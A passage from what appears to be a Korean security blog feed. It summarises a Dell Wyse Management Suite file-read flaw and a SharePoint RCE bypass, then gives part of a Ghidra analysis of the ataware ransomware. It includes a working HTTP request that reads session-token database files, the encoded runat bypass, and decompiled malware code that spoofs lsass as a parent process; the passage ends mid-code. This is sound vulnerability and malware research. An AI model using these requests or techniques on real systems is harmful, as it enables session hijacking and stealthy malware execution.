)</p></blockquote><p>&#xB2E4;&#xC74C; &#xD30C;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xD30C;&#xD2B8; 1&#xC758; &#xCEE4;&#xB110; &#xB514;&#xBC84;&#xAE45;&#xC73C;&#xB85C; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xD55C; &#xB4A4; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xAE4C;&#xC9C0; &#xD574;&#xBCF4;&#xB3C4;&#xB85D; &#xD558;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E4;&#xC74C;&#xC5D0; &#xB9CC;&#xB098;&#xC694; &#xC548;&#xB155;!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>kernel</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>local privilege escalation</tag>
      
      <tag>research</tag>
      
      <tag>windows driver</tag>
      
      <tag>third-party driver exploitation</tag>
      
      <tag>amd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21586/21587: Dell Wyse Management Suite Arbitrary File Read</title>
    <link href="/2021/07/13/l0ch/2021-07-13/"/>
    <url>/2021/07/13/l0ch/2021-07-13/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://research.nccgroup.com/2021/07/06/technical-advisory-arbitrary-file-read-in-dell-wyse-management-suite-cve-2021-21586-cve-2021-21587/">Technical Advisory &#x2013; Arbitrary File Read in Dell Wyse Management Suite (CVE-2021-21586, CVE-2021-21587)</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Dell Wyse Management Suit &lt; 3.3</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Dell&#xC758; &#xD074;&#xB77C;&#xC6B0;&#xB4DC; &#xC5D4;&#xB4DC;&#xD3EC;&#xC778;&#xD2B8; &#xAD00;&#xB9AC; &#xC194;&#xB8E8;&#xC158;&#xC778; Wyse Management Suite(WMS)&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xD30C;&#xC77C;&#xC744; &#xD3EC;&#xD568;&#xD55C; Arbitrary File Read &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC138;&#xBD80; &#xC815;&#xBCF4;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>WMS&#xC758; <code>/ccm-web/image/os</code> &#xB294; <code>filePath</code>&#xC640; <code>fileName</code> &#xB9E4;&#xAC1C;&#xBCC0;&#xC218;&#xB97C; &#xBC1B;&#xC544; &#xC2DC;&#xC2A4;&#xD15C; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xAC80;&#xC0C9;&#xD569;&#xB2C8;&#xB2E4;. &#xC7A5;&#xCE58; ID&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC694;&#xCCAD;&#xC744; &#xBCF4;&#xB0B4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC624;&#xB958; &#xBA54;&#xC138;&#xC9C0;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">PUT /ccm-web/image/pull/a/b HTTP/<span class="hljs-number">1.1</span>Host: [redacted]X-Stratus-device-id:wyse106[redacted]<span class="hljs-number">3149</span>-HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">500</span> Cache-Control: <span class="hljs-keyword">private</span>Expires: Thu, <span class="hljs-number">01</span> Jan <span class="hljs-number">1970</span> <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT...C:\Program Files\DELL\Software\repository\imagePull\staging\a\b (The system cannot find the path specified)</code></pre><p>&#xC624;&#xB958; &#xBA54;&#xC138;&#xC9C0;&#xC5D0;&#xC11C; WMS&#xAC00; &#xC124;&#xCE58;&#xB41C; &#xC2DC;&#xC2A4;&#xD15C;&#xC758; &#xACBD;&#xB85C;&#xAC00; &#xB178;&#xCD9C;&#xB418;&#xBA70; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC138;&#xC158; &#xD1A0;&#xD070;&#xC774; &#xC788;&#xB294; MySQL &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4; &#xD14C;&#xC774;&#xBE14;&#xC778; <code>[PATH]\DELL\WMS\Database\SQL\stratus\persistentlogin.ibd</code> &#xD30C;&#xC77C;&#xC5D0;&#xC11C; JSESSIONID &#xAC12;&#xC744; &#xCD94;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xACE0; &#xC774;&#xB294; &#xC138;&#xC158; &#xD558;&#xC774;&#xC7AC;&#xD0B9;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs c">GET /ccm-web/image/os?filePath=C:\Program Files\DELL\WMS\Database\SQL\stratus&amp;fileName=persistentlogin.ibd HTTP/<span class="hljs-number">1.1</span>Host: [redacted]X-Stratus-device-id:wyse106[redacted]<span class="hljs-number">3149</span></code></pre><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xBA74; &#xAD00;&#xB9AC; &#xC778;&#xD130;&#xD398;&#xC774;&#xC2A4;&#xC758; BIOS &#xD328;&#xC2A4;&#xC6CC;&#xB4DC; &#xC7AC;&#xC124;&#xC815; &#xBC0F; VNC&#xB97C; &#xD1B5;&#xD55C; &#xC6D0;&#xACA9; &#xD130;&#xBBF8;&#xB110; &#xB4F1;&#xC758; &#xAE30;&#xB2A5;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>L0ch</tag>
      
      <tag>arbitrary file read</tag>
      
      <tag>dell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-28474: SharePoint Interpretation conflict RCE</title>
    <link href="/2021/07/12/fabu1ous/2021-07-12/"/>
    <url>/2021/07/12/fabu1ous/2021-07-12/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.zerodayinitiative.com/blog/2021/7/7/cve-2021-28474-sharepoint-remote-code-execution-via-server-side-control-interpretation-conflict">CVE-2021-28474: SHAREPOINT REMOTE CODE EXECUTION VIA SERVER-SIDE CONTROL INTERPRETATION CONFLICT</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Microsoft SharePoint Server</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Microsoft SharPoint Server&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD328;&#xCE58;&#xB418;&#xC5B4; write-up&#xC774; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xBCF4;&#xC548; &#xD655;&#xC778;&#xC5D0; &#xC0AC;&#xC6A9;&#xB418;&#xB294; &#xCF54;&#xB4DC;&#xC640; &#xC2E4;&#xC81C;&#xB85C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xCF54;&#xB4DC; &#xAC04;&#xC758; &#xBD88;&#xC77C;&#xCE58;&#xB85C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC778;&#xC99D;&#xB41C; SharePoint &#xC0AC;&#xC6A9;&#xC790;&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD574; &#xC784;&#xC758;&#xC758; .NET &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><code>EditingPageParser.VerifyControlOnSafeList()</code> &#xD568;&#xC218;&#xB294; server-side control(<code>runat=&quot;server&quot;</code> attribute&#xAC00; &#xC788;&#xB294; tag)&#xC5D0; &#xD574;&#xB2F9;&#xD558;&#xB294; input&#xC744; &#xD30C;&#xC2F1;&#xD574; &#xD574;&#xC26C; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xB9CC;&#xB4E4;&#xACE0; &#xADF8; &#xAC12;&#xB4E4;&#xC744; <code>web.config</code> &#xD30C;&#xC77C;&#xACFC; &#xBE44;&#xAD50;&#xD558;&#xC5EC; &#xC548;&#xC804;&#xD55C; control &#xC778;&#xC9C0; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xBB38;&#xC81C;&#xB294; control&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xB550; &#xD30C;&#xC11C;&#xAC00; attribute&#xB97C; HTML-decode &#xD558;&#xC9C0;&#xB9CC;, verification &#xC791;&#xC5C5;&#xC5D0;&#xC120; HTML-decode&#xB97C; &#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB530;&#xB77C;&#xC11C; <code>runat=&quot;&amp;#115;erver&quot;</code>&#xC640; &#xAC19;&#xC740; ASPX tag attribute&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; verification &#xC2DC; server-side control&#xB85C; &#xC778;&#xC2DD;&#xB418;&#xC9C0; &#xC54A;&#xC544; bypass &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>microsoft</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>rce</tag>
      
      <tag>conflict</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2)</title>
    <link href="/2021/07/11/idioth/ghidra_part5/"/>
    <url>/2021/07/11/idioth/ghidra_part5/</url>
    
    <content type="html"><![CDATA[<p><strong>&#xB2E4;&#xB978; &#xD30C;&#xD2B8; &#xBCF4;&#xB7EC;&#xAC00;&#xAE30;</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2021/03/07/idioth/ghidra_part2/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 2 - Data, Functions, Scripts</a></p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 3 - tips for IDA User (Here!)</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 4 - Malware Analysis (1)</a></p><p>Re:versing&#xC73C;&#xB85C; &#xC2DC;&#xC791;&#xD558;&#xB294; ghidra &#xC0DD;&#xD65C; Part 5 - Malware Analysis (2) (Here!)</p><hr><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. idioth&#xC785;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC;&#xBAA8;&#xB85C; &#xC77C;&#xC815;&#xC774; &#xB51C;&#xB808;&#xC774;&#xAC00; &#xB418;&#xC5B4;&#xC11C; &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB97C; &#xC791;&#xC131;&#xD558;&#xB294;&#xB370; &#xAF64; &#xC624;&#xB79C; &#xC2DC;&#xAC04;&#xC774; &#xAC78;&#xB838;&#xB124;&#xC694;. &#xC774;&#xBC88; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C;&#xB294; ataware &#xB79C;&#xC12C;&#xC6E8;&#xC5B4;&#xC758; ATAPIConfiguration &#xBD80;&#xBD84;&#xC5D0; &#xB300;&#xD574; &#xBD84;&#xC11D;&#xD560; &#xC608;&#xC815;&#xC774;&#xC5D0;&#xC694;. &#xC138; &#xAC1C;&#xC758; &#xBC14;&#xC774;&#xB108;&#xB9AC; (ATAPIinit, ATAPIConfiguration, ATAPIUpdtr)&#xB97C; &#xBD84;&#xC11D;&#xD55C;&#xB2E4;&#xACE0; &#xD558;&#xC600;&#xC9C0;&#xB9CC;, &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xB2A5; &#xC790;&#xCCB4;&#xAC00; &#xD06C;&#xAC8C; &#xB2E4;&#xB974;&#xC9C0; &#xC54A;&#xACE0; &#xC545;&#xC131;&#xCF54;&#xB4DC; &#xBD84;&#xC11D;&#xC5D0; &#xCE58;&#xC911;&#xB418;&#xB294; &#xAC83; &#xAC19;&#xC544; &#xC774;&#xBC88; &#xD30C;&#xD2B8;&#xB97C; &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; ghidra &#xC2DC;&#xB9AC;&#xC988;&#xB294; &#xC644;&#xB8CC;&#xB420; &#xC608;&#xC815;&#xC785;&#xB2C8;&#xB2E4;.</p><h1 id="&#xC11C;&#xB860;"><a href="#&#xC11C;&#xB860;" class="headerlink" title="&#xC11C;&#xB860;"></a>&#xC11C;&#xB860;</h1><p>&#xC800;&#xBC88; &#xAC8C;&#xC2DC;&#xAE00;&#xC5D0;&#xC11C; ATAPIinit &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xAC00; <code>dropboxusercontent</code> &#xB9C1;&#xD06C;&#xC5D0; &#xC811;&#xC18D;&#xD558;&#xC5EC; ATAPIConfiguration&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xB294; &#xD604;&#xC7AC; &#xBE44;&#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; &#xC788;&#xC73C;&#xBBC0;&#xB85C; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB294; <a href="https://www.notion.so/3a72818cfd7e4c05aa3ca52a894ae0d6">app.any.run</a>&#xC5D0;&#xC11C; &#xAD6C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled.png" alt></p><p>Detect It Easy&#xB85C; &#xD655;&#xC778;&#xD55C; &#xACB0;&#xACFC; &#xC800;&#xBC88;&#xACFC; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; mingw gcc&#xB85C; &#xCEF4;&#xD30C;&#xC77C;&#xC774; &#xB41C; &#xD30C;&#xC77C;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%201.png" alt></p><p>&#xC774;&#xBC88;&#xC5D0;&#xB294; &#xC800;&#xBC88;&#xACFC; &#xB2EC;&#xB9AC; &#xD06C;&#xAC8C; &#xB208;&#xC5D0; &#xB744;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xC740; &#xC5C6;&#xC9C0;&#xB9CC;, <code>wininet.dll</code>, <code>berylia.net</code>, <code>Wlsass.exe</code> &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xBCF4;&#xACE0; &#xC720;&#xCD94;&#xD574;&#xBCFC; &#xB54C;, &#xD574;&#xB2F9; &#xB9C1;&#xD06C;&#xC5D0; network &#xC811;&#xC18D;&#xC744; &#xD558;&#xC5EC; <code>Wlsass.exe</code> &#xD30C;&#xC77C;&#xC744; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xCD94;&#xC815;&#xD560; &#xC218; &#xC788;&#xACA0;&#xB124;&#xC694;.</p><h1 id="Ghidra&#xB97C;-&#xD1B5;&#xD55C;-&#xAE30;&#xCD08;-&#xC815;&#xC801;-&#xBD84;&#xC11D;"><a href="#Ghidra&#xB97C;-&#xD1B5;&#xD55C;-&#xAE30;&#xCD08;-&#xC815;&#xC801;-&#xBD84;&#xC11D;" class="headerlink" title="Ghidra&#xB97C; &#xD1B5;&#xD55C; &#xAE30;&#xCD08; &#xC815;&#xC801; &#xBD84;&#xC11D;"></a>Ghidra&#xB97C; &#xD1B5;&#xD55C; &#xAE30;&#xCD08; &#xC815;&#xC801; &#xBD84;&#xC11D;</h1><p><img src="/2021/07/11/idioth/ghidra_part5/Untitled%202.png" alt></p><p>&#xBC8C;&#xC368; &#xB9C8;&#xC9C0;&#xB9C9; &#xD30C;&#xD2B8;&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD588;&#xC73C;&#xB2C8; &#xC774;&#xC81C; &#xBC14;&#xC774;&#xB108;&#xB9AC; &#xC815;&#xB3C4;&#xB294; &#xAC00;&#xBFD0;&#xD558;&#xAC8C; &#xC5F4;&#xACE0; analyze&#xB97C; &#xD558;&#xC2E4; &#xC218; &#xC788;&#xACA0;&#xC8E0;? ATAPIConfiguration&#xC744; &#xCD94;&#xAC00;&#xD574;&#xC900; &#xD6C4; analyze&#xAE4C;&#xC9C0; &#xD574;&#xC90D;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401cb7</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">bool</span> bVar1;  HMODULE pHVar2;  <span class="hljs-keyword">int</span> iVar3;  undefined3 extraout_var;  undefined4 uVar4;  HANDLE hHeap;  undefined4 local_2c4 [<span class="hljs-number">2</span>];  undefined4 local_2bc;  <span class="hljs-keyword">wchar_t</span> awStack672 [<span class="hljs-number">260</span>];  SIZE_T local_98;  undefined local_94 [<span class="hljs-number">16</span>];  undefined4 local_84 [<span class="hljs-number">17</span>];  LPVOID local_40;  <span class="hljs-keyword">int</span> local_3c [<span class="hljs-number">2</span>];  FARPROC local_34;  FARPROC local_30;  FARPROC local_2c;  FARPROC local_28;  DWORD local_24;  FARPROC local_20;  FARPROC local_1c;  <span class="hljs-keyword">int</span> local_18;  FARPROC local_14;  undefined4 local_10;    local_3c[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_14 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);  local_18 = (*local_14)(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);  local_2c4[<span class="hljs-number">0</span>] = <span class="hljs-number">0x22c</span>;  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_1c = GetProcAddress(pHVar2,<span class="hljs-string">&quot;Process32FirstW&quot;</span>);  pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  local_20 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;Process32NextW&quot;</span>);  iVar3 = (*local_1c)(local_18,local_2c4);  <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) {    local_24 = GetLastError();  }  <span class="hljs-keyword">do</span> {    iVar3 = wcscmp(awStack672,<span class="hljs-string">L&quot;lsass.exe&quot;</span>);    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) {      local_10 = local_2bc;    }    iVar3 = (*local_20)(local_18,local_2c4);  } <span class="hljs-keyword">while</span> (iVar3 != <span class="hljs-number">0</span>);  bVar1 = FUN_00401b91();  <span class="hljs-keyword">if</span> (CONCAT31(extraout_var,bVar1) == <span class="hljs-number">0</span>) {    uVar4 = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">else</span> {    pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);    local_28 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;OpenProcess&quot;</span>);    local_3c[<span class="hljs-number">0</span>] = (*local_28)(<span class="hljs-number">0x1f0fff</span>,<span class="hljs-number">0</span>,local_10);    <span class="hljs-keyword">if</span> (local_3c[<span class="hljs-number">0</span>] == <span class="hljs-number">0</span>) {      uVar4 = <span class="hljs-number">0</span>;    }    <span class="hljs-keyword">else</span> {      <span class="hljs-built_in">memset</span>(local_84,<span class="hljs-number">0</span>,<span class="hljs-number">0x48</span>);      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_2c = GetProcAddress(pHVar2,<span class="hljs-string">&quot;InitializeProcThreadAttributeList&quot;</span>);      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_30 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;UpdateProcThreadAttribute&quot;</span>);      (*local_2c)(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      hHeap = GetProcessHeap();      local_40 = HeapAlloc(hHeap,<span class="hljs-number">0</span>,local_98);      (*local_2c)(local_40,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      (*local_30)(local_40,<span class="hljs-number">0</span>,<span class="hljs-number">0x20000</span>,local_3c,<span class="hljs-number">4</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);      local_84[<span class="hljs-number">0</span>] = <span class="hljs-number">0x48</span>;      pHVar2 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      local_34 = GetProcAddress(pHVar2,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      iVar3 = (*local_34)(DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0x80010</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,local_84,local_94);      <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) {        uVar4 = <span class="hljs-number">0</span>;      }      <span class="hljs-keyword">else</span> {        uVar4 = <span class="hljs-number">1</span>;      }    }  }  <span class="hljs-keyword">return</span> uVar4;}</code></pre><p>&#xC774;&#xBC88; &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xC5D0;&#xC11C; &#xC911;&#xC810;&#xC801;&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD560; &#xBD80;&#xBD84;&#xC740; <code>FUN_00401cb7</code>&#xC785;&#xB2C8;&#xB2E4;. &#xC5ED;&#xC2DC;&#x2026; &#xCC98;&#xC74C; &#xC5F4;&#xC5C8;&#xC744; &#xB54C;&#xB294; &#xBCF4;&#xAE30;&#xAC00; &#xC0C1;&#xB2F9;&#xD788; &#xBD88;&#xD3B8;&#xD558;&#xB124;&#xC694;. &#xC774; &#xBCC0;&#xC218;&#xAC00; &#xC5B4;&#xB5A4; &#xAC74;&#xC9C0;&#xB3C4; &#xBAA8;&#xB974;&#xACA0;&#xACE0;~ &#xC800;&#xBC88; &#xC2DC;&#xAC04;&#xACFC; &#xAC19;&#xC774; &#xBCF4;&#xAE30; &#xD3B8;&#xD558;&#xAC8C; &#xC815;&#xB9AC;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">undefined4 <span class="hljs-title">FUN_00401cb7</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>{  <span class="hljs-keyword">bool</span> bVar1;  HMODULE hModule;  WINBOOL WVar2;  <span class="hljs-keyword">int</span> iVar3;  undefined3 extraout_var;  undefined4 uVar4;  HANDLE hHeap;  PROCESSENTRY32W lppe;  SIZE_T local_98;  _PROCESS_INFORMATION local_94;  _STARTUPINFOA local_84;  LPPROC_THREAD_ATTRIBUTE_LIST local_40;  HANDLE proc_handle [<span class="hljs-number">2</span>];  CreateProcessA *CreateProcessA_addr;  UpdateProcThreadAttribute *UpdateProcThreadAttribute_addr;  InitializeProcThreadAttributeList *InitializeProcThreadAttributeList_addr;  OpenProcess *OpenProcess_addr;  DWORD local_24;  Process32NextW *Process32NextW_addr;  Process32FirstW *Process32FirstW_addr;  HANDLE hSnapshot;  CreateToolhelp32Snapshot *CreateToolhelp32Snapshot_addr;  DWORD pid;    proc_handle[<span class="hljs-number">0</span>] = (HANDLE)<span class="hljs-number">0x0</span>;  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  CreateToolhelp32Snapshot_addr =       (CreateToolhelp32Snapshot *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateToolhelp32Snapshot&quot;</span>);  hSnapshot = (*CreateToolhelp32Snapshot_addr)(<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);  lppe.dwSize = <span class="hljs-number">0x22c</span>;  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  Process32FirstW_addr = (Process32FirstW *)GetProcAddress(hModule,<span class="hljs-string">&quot;Process32FirstW&quot;</span>);  hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);  Process32NextW_addr = (Process32NextW *)GetProcAddress(hModule,<span class="hljs-string">&quot;Process32NextW&quot;</span>);  WVar2 = (*Process32FirstW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;lppe);  <span class="hljs-keyword">if</span> (WVar2 == <span class="hljs-number">0</span>) {    local_24 = GetLastError();  }  <span class="hljs-keyword">do</span> {    iVar3 = wcscmp(lppe.szExeFile,<span class="hljs-string">L&quot;lsass.exe&quot;</span>);    <span class="hljs-keyword">if</span> (iVar3 == <span class="hljs-number">0</span>) {      pid = lppe.th32ProcessID;    }    WVar2 = (*Process32NextW_addr)(hSnapshot,(LPPROCESSENTRY32W)&amp;lppe);  } <span class="hljs-keyword">while</span> (WVar2 != <span class="hljs-number">0</span>);  bVar1 = FUN_00401b91();  <span class="hljs-keyword">if</span> (CONCAT31(extraout_var,bVar1) == <span class="hljs-number">0</span>) {    uVar4 = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">else</span> {    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);    OpenProcess_addr = (OpenProcess *)GetProcAddress(hModule,<span class="hljs-string">&quot;OpenProcess&quot;</span>);    proc_handle[<span class="hljs-number">0</span>] = (*OpenProcess_addr)(<span class="hljs-number">0x1f0fff</span>,<span class="hljs-number">0</span>,pid);    <span class="hljs-keyword">if</span> (proc_handle[<span class="hljs-number">0</span>] == (HANDLE)<span class="hljs-number">0x0</span>) {      uVar4 = <span class="hljs-number">0</span>;    }    <span class="hljs-keyword">else</span> {      <span class="hljs-built_in">memset</span>(&amp;local_84,<span class="hljs-number">0</span>,<span class="hljs-number">0x48</span>);      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      InitializeProcThreadAttributeList_addr =           (InitializeProcThreadAttributeList *)           GetProcAddress(hModule,<span class="hljs-string">&quot;InitializeProcThreadAttributeList&quot;</span>);      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      UpdateProcThreadAttribute_addr =           (UpdateProcThreadAttribute *)GetProcAddress(hModule,<span class="hljs-string">&quot;UpdateProcThreadAttribute&quot;</span>);      (*InitializeProcThreadAttributeList_addr)((LPPROC_THREAD_ATTRIBUTE_LIST)<span class="hljs-number">0x0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      hHeap = GetProcessHeap();      local_40 = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(hHeap,<span class="hljs-number">0</span>,local_98);      (*InitializeProcThreadAttributeList_addr)(local_40,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,&amp;local_98);      (*UpdateProcThreadAttribute_addr)(local_40,<span class="hljs-number">0</span>,<span class="hljs-number">0x20000</span>,proc_handle,<span class="hljs-number">4</span>,(PVOID)<span class="hljs-number">0x0</span>,(PSIZE_T)<span class="hljs-number">0x0</span>);      local_84.cb = <span class="hljs-number">0x48</span>;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);      CreateProcessA_addr = (CreateProcessA *)GetProcAddress(hModule,<span class="hljs-string">&quot;CreateProcessA&quot;</span>);      FUN_00401570();      WVar2 = (*CreateProcessA_addr)                        (DAT_00416028,(LPSTR)<span class="hljs-number">0x0</span>,(LPSECURITY_ATTRIBUTES)<span class="hljs-number">0x0</span>,                         (LPSECURITY_ATTRIBUTES)<span 